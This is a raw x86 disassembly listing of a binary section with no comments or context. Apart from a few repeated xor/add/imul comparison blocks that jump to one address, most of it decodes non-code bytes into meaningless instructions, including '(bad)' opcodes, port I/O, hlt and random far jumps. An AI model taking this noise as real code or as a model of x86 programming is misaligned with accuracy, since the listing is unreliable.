  40b8bc:	call   0x8d95bb9c
  40b8c1:	cmp    edi,DWORD PTR [eax+0x5cda627d]
  40b8c7:	cdq    
  40b8c8:	xchg   esi,eax
  40b8c9:	fs jne 0x40b932
  40b8cc:	adc    DWORD PTR [ebp+0x4117a62c],esp
  40b8d2:	scas   al,BYTE PTR es:[edi]
  40b8d3:	test   DWORD PTR [ebx+0x1e649f9e],ebx
  40b8d9:	mov    ds:0xb6713541,eax
  40b8de:	adc    dh,ch
  40b8e0:	push   ds
  40b8e1:	pop    ebp
  40b8e2:	xchg   ebx,eax
  40b8e3:	adc    BYTE PTR [edx+0xf4bdfc7],0x16
  40b8ea:	push   cs
  40b8eb:	jp     0x40b8cc
  40b8ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8ee:	lds    edi,FWORD PTR [ecx-0x5cb844bc]
  40b8f4:	cwde   
  40b8f5:	push   edi
  40b8f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8f7:	test   BYTE PTR [edi-0x74f8b470],ch
  40b8fd:	jge    0x40b8fb
  40b8ff:	xor    edx,eax
  40b901:	xor    edi,eax
  40b903:	add    edi,ecx
  40b905:	add    edx,ecx
  40b907:	imul   edx,edi
  40b90a:	mov    edi,DWORD PTR [ebp-0x8]
  40b90d:	mov    ebx,DWORD PTR [ebp-0x10]
  40b910:	sub    ebx,edi
  40b912:	cmp    ebx,edx
  40b914:	ja     0x40b922
  40b91a:	mov    edx,DWORD PTR [ebp-0x30]
  40b91d:	jmp    0x40c0ee
  40b922:	mov    edx,DWORD PTR [ebp-0x38]
  40b925:	mov    edi,DWORD PTR [ebp-0x4]
  40b928:	xor    edx,eax
  40b92a:	xor    edi,eax
  40b92c:	add    edi,ecx
  40b92e:	add    edx,ecx
  40b930:	imul   edx,edi
  40b933:	mov    edi,DWORD PTR [ebp-0x8]
  40b936:	jmp    0x40bcf4
  40b93b:	xchg   ebp,eax
  40b93c:	fcomi  st,st(6)
  40b93e:	push   esi
  40b93f:	jb     0x40b992
  40b941:	mov    ch,0xdb
  40b943:	shl    BYTE PTR [ebx+0x717866fb],cl
  40b949:	cmp    BYTE PTR [ecx],al
  40b94b:	pusha  
  40b94c:	xor    DWORD PTR [eax+0x70],0xffffff9f
  40b950:	jge    0x40b9c2
  40b952:	jo     0x40b95c
  40b954:	scas   al,BYTE PTR es:[edi]
  40b955:	xor    bl,BYTE PTR [esi+0x28]
  40b958:	adc    bh,ah
  40b95a:	dec    esp
  40b95b:	mov    dl,BYTE PTR [eax+0x0]
  40b95e:	add    edx,DWORD PTR [esi+eiz*8-0x4a]
  40b962:	hlt    
  40b963:	or     DWORD PTR [edx-0x6d9e56d6],edi
  40b969:	mov    ecx,eax
  40b96b:	cdq    
  40b96c:	inc    eax
  40b96d:	sbb    ebp,DWORD PTR [ecx+0x604bf8bd]
  40b973:	mov    DWORD PTR [edx-0x5057d3c4],eax
  40b979:	je     0x40b9ca
  40b97b:	and    BYTE PTR [ebx],ah
  40b97d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b97e:	cs inc edx
  40b980:	out    0x3d,eax
  40b982:	ins    DWORD PTR es:[edi],dx
  40b983:	aas    
  40b984:	mov    al,ds:0x77241ad5
  40b989:	dec    ecx
  40b98a:	sub    bh,BYTE PTR [edx]
  40b98c:	leave  
  40b98d:	or     BYTE PTR [edi-0x15d654c],0xd4
  40b994:	xchg   ecx,eax
  40b995:	and    al,0x52
  40b997:	imul   eax,DWORD PTR [ebp+esi*1-0x294410f2],0xffffffab
  40b99f:	int    0x4f
  40b9a1:	push   ss
  40b9a2:	mov    ds:0x64b9e677,eax
  40b9a7:	jle    0x40b973
  40b9a9:	jmp    0x40b999
  40b9ab:	out    0x5f,al
  40b9ad:	and    al,0x33
  40b9af:	sbb    al,0xd8
  40b9b1:	sbb    al,0x8b
  40b9b3:	pop    ebx
  40b9b4:	lock outs dx,BYTE PTR ds:[esi]
  40b9b6:	hlt    
  40b9b7:	xlat   BYTE PTR ds:[ebx]
  40b9b8:	cmp    al,0xa1
  40b9ba:	cmc    
  40b9bb:	adc    ecx,DWORD PTR ds:0x9e057297
  40b9c1:	pop    ebp
  40b9c2:	adc    eax,0xb9f725cc
  40b9c7:	add    ax,dx
  40b9ca:	shl    DWORD PTR [eax],cl
  40b9cc:	push   ebp
  40b9cd:	sbb    BYTE PTR [esi-0x2ecba2cd],ah
  40b9d3:	and    eax,DWORD PTR [edi]
  40b9d5:	sbb    DWORD PTR [ebx],esi
  40b9d7:	ins    DWORD PTR es:[edi],dx
  40b9d8:	pop    edx
  40b9d9:	jecxz  0x40b9ea
  40b9db:	jnp    0x40b995
  40b9dd:	pop    ds
  40b9de:	gs bnd jb 0x40ba51
  40b9e2:	mov    cl,0x93
  40b9e4:	je     0x40b9f2
  40b9e6:	lods   al,BYTE PTR ds:[esi]
  40b9e7:	cdq    
  40b9e8:	ins    BYTE PTR es:[edi],dx
  40b9e9:	and    eax,0x9948411b
  40b9ee:	into   
  40b9ef:	mov    ds:0xf22172ad,al
  40b9f4:	mov    dl,0x36
  40b9f6:	xlat   BYTE PTR ds:[ebx]
  40b9f7:	mov    bh,0xdb
  40b9f9:	shl    BYTE PTR [edi+eiz*4-0x6ef5c93],1
  40ba00:	cmp    ebp,eax
  40ba02:	cmp    dh,ah
  40ba04:	xchg   esi,eax
  40ba05:	push   edx
  40ba06:	or     BYTE PTR [ecx],cl
  40ba08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba09:	sub    BYTE PTR [eax],0x3f
  40ba0c:	or     bh,BYTE PTR [ebx-0x55]
  40ba0f:	or     DWORD PTR [edx-0x26273de5],edx
  40ba15:	inc    edx
  40ba16:	test   al,0xf
  40ba18:	or     eax,0xb725df91
  40ba1d:	aad    0xc9
  40ba1f:	call   0x3270822f
  40ba24:	xor    edi,DWORD PTR [ebp+0x29]
  40ba27:	pop    eax
  40ba28:	std    
  40ba29:	mov    eax,ds:0x109a3f73
  40ba2e:	push   ds
  40ba2f:	jo     0x40ba93
  40ba31:	or     edx,DWORD PTR [edx]
  40ba33:	je     0x40ba61
  40ba35:	or     bl,dh
  40ba37:	or     eax,0x5b5c6029
  40ba3c:	aam    0xaf
  40ba3e:	push   esp
  40ba3f:	test   ch,cl
  40ba41:	fisubr DWORD PTR [eax-0x18]
  40ba44:	push   ds
  40ba45:	pushf  
  40ba46:	loop   0x40bab2
  40ba48:	mov    ebx,0x29226d3f
  40ba4d:	xchg   ebp,eax
  40ba4e:	adc    ebp,ebp
  40ba50:	repz mov dh,0x90
  40ba53:	je     0x40ba76
  40ba55:	inc    esi
  40ba56:	jb     0x40ba4e
  40ba58:	cmp    dl,BYTE PTR [eax+eiz*8+0x0]
  40ba5c:	rol    DWORD PTR [edi],cl
  40ba5e:	jae    0x40b9e1
  40ba60:	and    eax,0xd0072059
  40ba65:	iret   
  40ba66:	add    eax,0x5cd5b443
  40ba6b:	pop    ds
  40ba6c:	jmp    0x7936:0xae2284b9
  40ba73:	daa    
  40ba74:	mov    esp,0x49891fcd
  40ba79:	dec    ebp
  40ba7a:	push   esi
  40ba7b:	ins    DWORD PTR es:[edi],dx
  40ba7c:	jp     0x40bad4
  40ba7e:	inc    edx
  40ba7f:	or     BYTE PTR [edi-0x6c],cl
  40ba82:	sbb    edx,DWORD PTR [edx]
  40ba84:	ja     0x40babc
  40ba86:	and    al,0xed
  40ba88:	pushf  
  40ba89:	xor    BYTE PTR [ebx+0x45cbf119],0x1b
  40ba90:	jmp    0xabb5e80f
  40ba95:	mov    esi,esi
  40ba97:	add    al,0x4d
  40ba99:	mov    dh,0x8d
  40ba9b:	or     eax,0x80da817
  40baa0:	cwde   
  40baa1:	nop
  40baa2:	(bad)  
  40baa3:	rol    DWORD PTR [edx+edx*4],1
  40baa6:	sub    eax,0x3e8cdd68
  40baab:	sti    
  40baac:	mov    BYTE PTR [edi-0x9],bl
  40baaf:	xor    eax,0xd27b3f31
  40bab4:	imul   BYTE PTR [esi-0x60b135db]
  40baba:	mov    eax,edx
  40babc:	leave  
  40babd:	adc    eax,0x4bf512b0
  40bac2:	xchg   ecx,eax
  40bac3:	repnz push cs
  40bac5:	mov    ecx,0x467c5eb9
  40baca:	xor    ebp,DWORD PTR [eax+0x2841f3d5]
  40bad0:	cmp    al,0x76
  40bad2:	jle    0x40bae5
  40bad4:	pop    esi
  40bad5:	cmc    
  40bad6:	push   edi
  40bad7:	enter  0x40ee,0x3d
  40badb:	out    dx,al
  40badc:	lahf   
  40badd:	je     0x40bb32
  40badf:	sti    
  40bae0:	loopne 0x40baa3
  40bae2:	std    
  40bae3:	loopne 0x40bb24
  40bae5:	clc    
  40bae6:	dec    edx
  40bae7:	xor    BYTE PTR [eax+eax*1],bh
  40baea:	xchg   BYTE PTR [esi+edi*1],al
  40baed:	lods   al,BYTE PTR ds:[esi]
  40baee:	xchg   esp,eax
  40baef:	adc    BYTE PTR [ebx-0x4a671dda],ah
  40baf5:	aam    0x68
  40baf7:	jno    0x40bb2b
  40baf9:	inc    ebp
  40bafa:	sub    edx,0xd96e823d
  40bb00:	push   ss
  40bb01:	jns    0x40bb2a
  40bb03:	int    0xbf
  40bb05:	sbb    al,0xc3
  40bb07:	(bad)  
  40bb08:	sub    DWORD PTR [eax],edi
  40bb0a:	imul   eax,DWORD PTR [esi+0x34e6991a],0x30
  40bb11:	ss jg  0x40bafe
  40bb14:	jb     0x40bb68
  40bb16:	fistp  DWORD PTR [edx+esi*4-0x80]
  40bb1a:	mov    eax,0x86927142
  40bb1f:	jge    0x40bb25
  40bb21:	arpl   WORD PTR [ebx-0x1c67ed73],si
  40bb27:	loope  0x40bab4
  40bb29:	add    eax,0x9a75b87a
  40bb2e:	cmp    edi,DWORD PTR ss:[ebp-0x467344b4]
  40bb35:	(bad)  
  40bb36:	fild   WORD PTR [esi]
  40bb38:	mov    ds:0x251cc433,eax
  40bb3d:	rol    DWORD PTR [esi],1
  40bb3f:	xchg   ebx,eax
  40bb40:	pushf  
  40bb41:	cdq    
  40bb42:	jl     0x40bb83
  40bb44:	ss retf 
  40bb46:	test   BYTE PTR [edx],0x6a
  40bb49:	bound  ecx,QWORD PTR [ebp-0x1a]
  40bb4c:	and    ecx,ebx
  40bb4e:	pop    esi
  40bb4f:	add    bh,BYTE PTR [ecx]
  40bb51:	pop    ebx
  40bb52:	out    0x27,al
  40bb54:	aaa    
  40bb55:	push   0xc5898670
  40bb5a:	pusha  
  40bb5b:	sar    BYTE PTR [ebx+edx*1],1
  40bb5e:	xchg   ebx,eax
  40bb5f:	fcom   DWORD PTR [edi-0x70f3f1d3]
  40bb65:	ret    
  40bb66:	xchg   edx,eax
  40bb67:	daa    
  40bb68:	fwait
  40bb69:	mov    ch,0x2a
  40bb6b:	push   es
  40bb6c:	xchg   edx,eax
  40bb6d:	shl    DWORD PTR [edx],cl
  40bb6f:	enter  0xf0eb,0x36
  40bb73:	cmp    eax,DWORD PTR [ebx+0x16]
  40bb76:	xor    eax,0x9ee566f7
  40bb7b:	inc    eax
  40bb7c:	xchg   DWORD PTR [edx+edx*1+0x1d],edx
  40bb80:	loope  0x40bb43
  40bb82:	cwde   
  40bb83:	sbb    dl,BYTE PTR [ebp+eax*2+0x43a40650]
  40bb8a:	mov    bh,0x6c
  40bb8c:	sub    al,BYTE PTR [eax+0x1f]
  40bb8f:	sub    eax,0xab9d8655
  40bb94:	sbb    al,0x4e
  40bb96:	jbe    0x40bb23
  40bb98:	mov    cs,WORD PTR [esi+0x35]
  40bb9b:	sbb    dl,al
  40bb9d:	mov    al,0x6b
  40bb9f:	push   ss
  40bba0:	cwde   
  40bba1:	lock inc edx
  40bba3:	fisub  WORD PTR fs:[edi]
  40bba6:	in     eax,dx
  40bba7:	or     esi,DWORD PTR [edx+ebp*4+0x40]
  40bbab:	scas   eax,DWORD PTR es:[edi]
  40bbac:	or     esp,ebx
  40bbae:	bound  ebx,QWORD PTR [esi]
  40bbb0:	jp     0x40bb45
  40bbb2:	retf   0x6fde
  40bbb5:	sbb    BYTE PTR [ebx],0xf1
  40bbb8:	jp     0x40bbdb
  40bbba:	push   edx
  40bbbb:	bound  eax,QWORD PTR [ebx+0x6104331e]
  40bbc1:	push   ds
  40bbc2:	loop   0x40bb9f
  40bbc4:	cs xchg ebx,eax
  40bbc6:	sbb    ax,0x4405
  40bbca:	ds push esp
  40bbcc:	jmp    0x40bbc8
  40bbce:	(bad)
  40bbd1:	stos   DWORD PTR es:[edi],eax
  40bbd2:	call   0xaacba921
  40bbd7:	leave  
  40bbd8:	xor    eax,0xae9bcf82
  40bbdd:	xchg   ecx,eax
  40bbde:	(bad)  
  40bbdf:	sbb    BYTE PTR [esi-0x12],0xdb
  40bbe3:	pushf  
  40bbe4:	in     eax,0x36
  40bbe6:	scas   al,BYTE PTR es:[edi]
  40bbe7:	add    bh,BYTE PTR ds:0xdaff61a7
  40bbed:	push   cs
  40bbee:	cmp    BYTE PTR [edi],ch
  40bbf0:	xchg   esp,eax
  40bbf1:	lods   eax,DWORD PTR cs:[esi]
  40bbf3:	(bad)  
  40bbf4:	xor    cl,ch
  40bbf6:	sbb    BYTE PTR [ebp-0x6cb40890],0x8a
  40bbfd:	lea    ebp,[edi+0x3]
  40bc00:	pop    ecx
  40bc01:	inc    edx
  40bc02:	mov    edi,0xf3db0c0b
  40bc07:	cmp    al,0xc3
  40bc09:	out    dx,al
  40bc0a:	or     edi,eax
  40bc0c:	push   eax
  40bc0d:	push   eax
  40bc0e:	fcom   DWORD PTR [ebp-0x2]
  40bc11:	push   cs
  40bc12:	ins    DWORD PTR es:[edi],dx
  40bc13:	fmul   DWORD PTR [ecx]
  40bc15:	pop    ecx
  40bc16:	(bad)  
  40bc17:	fdiv   QWORD PTR [edi+edi*8+0x5547783]
  40bc1e:	iret   
  40bc1f:	stc    
  40bc20:	sbb    dh,BYTE PTR [edx+edx*2+0x282930a5]
  40bc27:	sub    ebx,DWORD PTR [ebp+eiz*2-0x10]
  40bc2b:	cld    
  40bc2c:	jle    0x40bc66
  40bc2e:	jb     0x40bbf3
  40bc30:	push   es
  40bc31:	sub    eax,0xde7386b
  40bc36:	es pop ss
  40bc38:	mov    ch,0x30
  40bc3a:	jnp    0x40bbd7
  40bc3c:	fimul  WORD PTR [edx-0x7073e492]
  40bc42:	pop    edi
  40bc43:	aaa    
  40bc44:	(bad)  
  40bc45:	sar    BYTE PTR [edx+edi*1],1
  40bc48:	ror    BYTE PTR [ebx-0xe588888],0x58
  40bc4f:	mov    eax,0x21ba9b3d
  40bc54:	and    ebx,DWORD PTR [ebx+0x2bace5db]
  40bc5a:	sub    ecx,DWORD PTR es:0xc2ca6178
  40bc61:	adc    edx,DWORD PTR es:[esi+esi*2+0x4ce5b8ec]
  40bc69:	jecxz  0x40bc19
  40bc6b:	xor    esi,DWORD PTR [esp+esi*2+0x7d]
  40bc6f:	mov    ?,WORD PTR [ebp-0x70d945be]
  40bc75:	mov    eax,ds:0x772765d7
  40bc7a:	or     eax,0x67fce502
  40bc7f:	scas   eax,DWORD PTR es:[edi]
  40bc80:	dec    edx
  40bc81:	leave  
  40bc82:	outs   dx,BYTE PTR ds:[esi]
  40bc83:	mov    esp,DWORD PTR [edi+0x45]
  40bc86:	mov    eax,ds:0x94b6db3e
  40bc8b:	bound  eax,QWORD PTR [edx]
  40bc8d:	out    0xd7,eax
  40bc8f:	dec    ecx
  40bc90:	imul   ecx,DWORD PTR [edx+ecx*2+0x1f],0x12
  40bc95:	outs   dx,BYTE PTR ds:[esi]
  40bc96:	(bad)  
  40bc97:	les    ecx,FWORD PTR [eax+ecx*4-0x7]
  40bc9b:	in     eax,dx
  40bc9c:	pusha  
  40bc9d:	push   edi
  40bc9e:	sub    al,0x81
  40bca0:	mov    esp,0xe8b7f67b
  40bca5:	or     cl,BYTE PTR gs:[esp+edx*8-0x2a]
  40bcaa:	lock or BYTE PTR [eax],0xfb
  40bcae:	hlt    
  40bcaf:	sub    bh,BYTE PTR [edi-0x6b9e9b8e]
  40bcb5:	sbb    BYTE PTR [edx+0x2d81b30e],ah
  40bcbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcbc:	sbb    eax,0x45db8fbb
  40bcc1:	cmp    DWORD PTR [ecx],ebp
  40bcc3:	push   edi
  40bcc4:	jg     0x40bc86
  40bcc6:	push   cs
  40bcc7:	mov    ds:0x347969c,eax
  40bccc:	pop    eax
  40bccd:	add    BYTE PTR [si-0x36],bl
  40bcd1:	lds    esi,FWORD PTR [esi+0x10]
  40bcd4:	stc    
  40bcd5:	cmp    al,0x2d
  40bcd7:	xor    eax,0xbf4d0193
  40bcdc:	mov    cs,WORD PTR [edx+ebp*1-0x7dabf6e8]
  40bce3:	ss movs DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40bce6:	xor    esi,DWORD PTR [edi]
  40bce8:	popf   
  40bce9:	adc    al,0xe6
  40bceb:	pusha  
  40bcec:	mov    WORD PTR [esi],es
  40bcee:	and    eax,0xac78d651
  40bcf3:	(bad)  
  40bcf4:	mov    ebx,DWORD PTR [ebp-0x10]
  40bcf7:	sub    ebx,edi
  40bcf9:	cmp    ebx,edx
  40bcfb:	ja     0x40bd09
  40bd01:	mov    edx,DWORD PTR [ebp-0x34]
  40bd04:	jmp    0x40c0ee
  40bd09:	mov    edx,DWORD PTR [ebp-0x3c]
  40bd0c:	mov    edi,DWORD PTR [ebp-0x4]
  40bd0f:	xor    edx,eax
  40bd11:	xor    edi,eax
  40bd13:	add    edx,ecx
  40bd15:	add    edi,ecx
  40bd17:	imul   edx,edi
  40bd1a:	mov    edi,DWORD PTR [ebp-0x8]
  40bd1d:	mov    ebx,DWORD PTR [ebp-0x10]
  40bd20:	sub    ebx,edi
  40bd22:	cmp    ebx,edx
  40bd24:	mov    edx,DWORD PTR [ebp-0x38]
  40bd27:	jbe    0x40c0ee
  40bd2d:	jmp    0x40c0eb
  40bd32:	xchg   edx,eax
  40bd33:	dec    edx
  40bd34:	inc    edx
  40bd35:	inc    esp
  40bd36:	inc    edx
  40bd37:	push   esp
  40bd38:	xchg   edx,eax
  40bd39:	dec    edx
  40bd3a:	fdiv   DWORD PTR [edx+edi*8]
  40bd3d:	adc    cl,BYTE PTR [eax-0x70c31a32]
  40bd43:	(bad)  
  40bd44:	jo     0x40bdb6
  40bd46:	lahf   
  40bd47:	jge    0x40bdb9
  40bd49:	jo     0x40bd89
  40bd4b:	dec    ecx
  40bd4c:	add    al,0x14
  40bd4e:	jo     0x40bd92
  40bd50:	jbe    0x40bd9b
  40bd52:	leave  
  40bd53:	std    
  40bd54:	add    al,0x5e
  40bd56:	lock in eax,0xca
  40bd59:	in     al,0x35
  40bd5b:	rol    BYTE PTR [esp+edi*4+0xed0c974],0xff
  40bd63:	stc    
  40bd64:	adc    al,0x38
  40bd66:	stos   BYTE PTR es:[edi],al
  40bd67:	or     BYTE PTR [ebx-0x137c2a0e],dh
  40bd6d:	lods   eax,DWORD PTR ds:[esi]
  40bd6e:	(bad)  
  40bd6f:	ror    BYTE PTR [ebx-0x2],cl
  40bd72:	test   BYTE PTR [esi-0x4e],ah
  40bd75:	xchg   ecx,eax
  40bd76:	add    al,0x51
  40bd78:	mov    ch,0x7f
  40bd7a:	add    DWORD PTR [ecx-0x50],ebx
  40bd7d:	shl    BYTE PTR [ebp+0x1c],1
  40bd80:	pop    esp
  40bd81:	push   ebx
  40bd82:	repnz mov esi,0x2d9d16d3
  40bd88:	mov    BYTE PTR ds:0x5c1266d3,bl
  40bd8e:	inc    edi
  40bd8f:	cmp    eax,0xe4f59048
  40bd94:	xchg   edi,eax
  40bd95:	scas   eax,DWORD PTR es:[edi]
  40bd96:	out    0x87,eax
  40bd98:	aaa    
  40bd99:	sub    edi,edi
  40bd9b:	and    esi,DWORD PTR [esi]
  40bd9d:	mov    ebp,0x1314bd05
  40bda2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bda3:	lea    esi,[edx-0x5a]
  40bda6:	inc    ebp
  40bda7:	and    DWORD PTR [ebx+0x3b],0x8f7ba9ab
  40bdae:	push   ebp
  40bdaf:	lock jbe 0x40bdb7
  40bdb2:	cmp    al,0x2e
  40bdb4:	and    BYTE PTR [ebp+0x2e],0x4f
  40bdb8:	fwait
  40bdb9:	dec    eax
  40bdba:	out    dx,al
  40bdbb:	jp     0x40bda5
  40bdbd:	xor    DWORD PTR [edi],eax
  40bdbf:	pop    ebp
  40bdc0:	dec    esp
  40bdc1:	sub    eax,0x85b76b25
  40bdc6:	ret    
  40bdc7:	imul   eax,DWORD PTR [edi-0x79],0xffffffca
  40bdcb:	push   eax
  40bdcc:	mov    cl,0x2d
  40bdcf:	fwait
  40bdd0:	inc    edx
  40bdd1:	mov    dl,0x1f
  40bdd3:	retf   
  40bdd4:	fwait
  40bdd5:	cli    
  40bdd6:	in     al,dx
  40bdd7:	push   ss
  40bdd8:	mov    dl,0x8a
  40bdda:	cmp    ebp,ebp
  40bddc:	into   
  40bddd:	daa    
  40bdde:	aaa    
  40bddf:	mov    eax,0x332a1e4a
  40bde4:	xchg   edx,eax
  40bde5:	(bad)  
  40bde6:	mov    ebx,0x3fab89e3
  40bdeb:	push   ds
  40bdec:	ins    DWORD PTR es:[edi],dx
  40bded:	and    edi,ecx
  40bdef:	dec    eax
  40bdf0:	in     al,dx
  40bdf1:	dec    esi
  40bdf2:	add    eax,0x99557f2a
  40bdf7:	jne    0x40be0e
  40bdf9:	adc    al,0x85
  40bdfb:	inc    ecx
  40bdfc:	js     0x40be17
  40bdfe:	push   es
  40bdff:	in     eax,0x7c
  40be01:	pop    esp
  40be02:	int3   
  40be03:	jge    0x40bd86
  40be05:	xchg   ebp,eax
  40be06:	or     BYTE PTR [eax+0x57158fce],dl
  40be0c:	jge    0x40be6d
  40be0e:	xchg   cl,dl
  40be10:	sbb    al,0x1b
  40be12:	mov    dl,dl
  40be14:	adc    al,0xab
  40be16:	or     DWORD PTR [eax+0x4a],0xf379e457
  40be1d:	pop    ds
  40be1e:	jge    0x9f99bf7d
  40be24:	enter  0xaa04,0x8b
  40be28:	xor    DWORD PTR [ecx+eiz*1],ebx
  40be2b:	push   esp
  40be2c:	mov    al,ds:0x90ab25a3
  40be31:	push   edi
  40be32:	jnp    0x40be00
  40be34:	out    0xbc,eax
  40be36:	dec    esi
  40be37:	and    edi,esi
  40be39:	dec    edi
  40be3a:	sbb    DWORD PTR [ecx-0x43],edi
  40be3d:	xchg   ebp,eax
  40be3e:	into   
  40be3f:	xchg   ecx,eax
  40be40:	xor    edi,DWORD PTR [esp+edx*8+0x75cf65f0]
  40be47:	mov    ds:0x79b1e0a,eax
  40be4c:	cmp    DWORD PTR [edx-0x68763d9a],edx
  40be52:	or     DWORD PTR [edi+0x7a],edi
  40be55:	jns    0x40be20
  40be57:	pop    ebp
  40be58:	imul   edx,DWORD PTR [ebp+eax*2-0x51225d6],0xffffffb8
  40be60:	out    0x47,eax
  40be62:	dec    eax
  40be63:	jmp    0x55bb:0xba356fa4
  40be6a:	inc    ebp
  40be6b:	jle    0x40bdee
  40be6d:	ret    
  40be6e:	es jl  0x40be26
  40be71:	pop    es
  40be72:	outs   dx,BYTE PTR ds:[esi]
  40be73:	ror    DWORD PTR [esi+eax*1+0x2647ac46],cl
  40be7a:	mov    bh,0x74
  40be7c:	int    0xb7
  40be7e:	ficomp WORD PTR [edx]
  40be80:	cld    
  40be81:	int3   
  40be82:	xlat   BYTE PTR ds:[ebx]
  40be83:	popa   
  40be84:	add    al,0xde
  40be86:	push   esi
  40be87:	jns    0x40bed8
  40be89:	pushf  
  40be8a:	adc    DWORD PTR [eax+0x5e],0x36198464
  40be91:	and    eax,0xb7586599
  40be96:	xor    ah,BYTE PTR [edi+esi*8]
  40be99:	pop    esi
  40be9a:	addr16 mov ebp,0xc5b6eb9a
  40bea0:	lods   eax,DWORD PTR ds:[esi]
  40bea1:	jecxz  0x40be72
  40bea3:	push   esp
  40bea4:	and    DWORD PTR [edi],0x2dcc0c7a
  40beaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40beab:	in     eax,0x91
  40bead:	sub    eax,0x248fe0d0
  40beb2:	das    
  40beb3:	stos   DWORD PTR es:[edi],eax
  40beb4:	pop    ecx
  40beb5:	popf   
  40beb6:	cmp    BYTE PTR [ebp+0x1f8b9656],ch
  40bebc:	or     edi,esp
  40bebe:	test   al,0x28
  40bec0:	cmp    eax,0xa3e5da97
  40bec5:	push   ecx
  40bec6:	les    eax,FWORD PTR [esi]
  40bec8:	adc    esp,DWORD PTR [edx+0x2]
  40becb:	retf   0x5c30
  40bece:	sahf   
  40becf:	mov    cl,0xf
  40bed1:	push   0x21
  40bed3:	retf   
  40bed4:	jl     0x40bf22
  40bed6:	neg    DWORD PTR [edi+0x60080183]
  40bedc:	sub    al,0xc0
  40bede:	push   ss
  40bedf:	adc    ch,0xcf
  40bee2:	cdq    
  40bee3:	mov    BYTE PTR [eax+0x45fbc5d],bl
  40bee9:	sar    DWORD PTR [eax+ebp*4+0x45],cl
  40beed:	dec    esi
  40beee:	jae    0x40bf34
  40bef0:	sti    
  40bef1:	mov    ecx,0x6ade7fe9
  40bef6:	lods   eax,DWORD PTR ds:[esi]
  40bef7:	jnp    0x40bedf
  40bef9:	mov    bl,0x92
  40befb:	int    0xc7
  40befd:	mov    bh,0x59
  40beff:	imul   edx,DWORD PTR es:[ebx-0x1f],0x646284b4
  40bf07:	add    ecx,DWORD PTR [edx+0x13283081]
  40bf0d:	repnz nop
  40bf0f:	sub    al,0xf5
  40bf11:	ds xchg ecx,eax
  40bf13:	popf   
  40bf14:	mov    ebx,0xdd31d969
  40bf19:	jge    0x40bf9a
  40bf1b:	push   0xffffffb3
  40bf1d:	into   
  40bf1e:	pop    edx
  40bf1f:	mov    ds:0x555a1c1e,eax
  40bf24:	or     BYTE PTR [edx+0x63700523],ah
  40bf2a:	dec    esp
  40bf2b:	idiv   DWORD PTR ds:0x8dd9a6dd
  40bf31:	sar    DWORD PTR [ebx+0x53],cl
  40bf34:	sub    al,0xd0
  40bf36:	stos   DWORD PTR es:[edi],eax
  40bf37:	pop    esp
  40bf38:	stos   BYTE PTR es:[edi],al
  40bf39:	jno    0x40bfb1
  40bf3b:	imul   ebx,DWORD PTR [ecx-0x6],0x18
  40bf3f:	sbb    eax,0x990b585d
  40bf44:	inc    ebp
  40bf45:	push   edi
  40bf46:	xor    al,0x5d
  40bf48:	lea    ecx,[edi]
  40bf4a:	js     0x40bef3
  40bf4c:	mov    ebp,0xe99be15c
  40bf51:	xchg   DWORD PTR [ebx],ebx
  40bf53:	pop    edx
  40bf54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf55:	jns    0x40bf14
  40bf57:	psrad  mm5,QWORD PTR [ebp-0x1]
  40bf5b:	out    0x1b,al
  40bf5d:	adc    al,0xb1
  40bf5f:	sub    eax,0x70584318
  40bf64:	lds    edx,FWORD PTR [edi]
  40bf66:	daa    
  40bf67:	out    0x7e,eax
  40bf69:	cwde   
  40bf6a:	imul   edi,DWORD PTR [edx+0x80b11e],0x89db9473
  40bf74:	aad    0x46
  40bf76:	ret    
  40bf77:	out    0x28,al
  40bf79:	fst    DWORD PTR [esi-0xc294301]
  40bf7f:	mov    gs,eax
  40bf81:	jmp    FWORD PTR [edi+0x202d087c]
  40bf87:	icebp  
  40bf88:	in     eax,0xe0
  40bf8a:	mov    bh,0xc7
  40bf8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf8d:	out    0xe,al
  40bf8f:	scas   eax,DWORD PTR es:[edi]
  40bf90:	jp     0x40bfc1
  40bf92:	rol    BYTE PTR [edi],1
  40bf94:	jge    0x40bfff
  40bf96:	push   es
  40bf97:	mov    eax,0xc60efe95
  40bf9c:	shl    edx,0xa8
  40bf9f:	retf   
  40bfa0:	int    0x3c
  40bfa2:	stos   BYTE PTR es:[edi],al
  40bfa3:	mov    dl,0xf6
  40bfa5:	gs call 0xd688:0x6bbd6887
  40bfad:	(bad)  
  40bfae:	sbb    al,ah
  40bfb0:	fild   DWORD PTR [ebx]
  40bfb2:	mov    ah,0xcd
  40bfb4:	sar    ch,1
  40bfb6:	adc    DWORD PTR [eax+eiz*4+0x7c],0x39
  40bfbb:	pop    eax
  40bfbc:	lahf   
  40bfbd:	sub    ecx,eax
  40bfbf:	and    BYTE PTR [ecx+eiz*4+0x49078404],dh
  40bfc6:	lea    ebp,[esi+0x4f7ec30d]
  40bfcc:	pop    ss
  40bfcd:	jo     0x40bf7c
  40bfcf:	push   ebx
  40bfd0:	imul   DWORD PTR [ebx]
  40bfd2:	pushf  
  40bfd3:	stc    
  40bfd4:	mov    esi,0x9adf58a7
  40bfd9:	xlat   BYTE PTR ds:[ebx]
  40bfda:	rol    BYTE PTR [eax-0x36],0x8a
  40bfde:	push   eax
  40bfdf:	pop    ss
  40bfe0:	push   esp
  40bfe1:	ror    al,cl
  40bfe3:	imul   esp,DWORD PTR [eax-0x21],0xfffffff8
  40bfe7:	pop    esp
  40bfe8:	xor    ch,BYTE PTR [edx-0x40ab6bec]
  40bfee:	in     eax,dx
  40bfef:	dec    esp
  40bff0:	jno    0x40bfb2
  40bff2:	cwde   
  40bff3:	adc    esi,DWORD PTR [ecx-0x70aca448]
  40bff9:	adc    edx,eax
  40bffb:	add    eax,DWORD PTR [edi-0x36]
  40bffe:	out    0x30,al
  40c000:	cmc    
  40c001:	sub    dh,BYTE PTR [eax]
  40c003:	mov    ch,0xef
  40c005:	dec    esp
  40c006:	outs   dx,BYTE PTR ds:[esi]
  40c007:	out    0x4e,eax
  40c009:	dec    esi
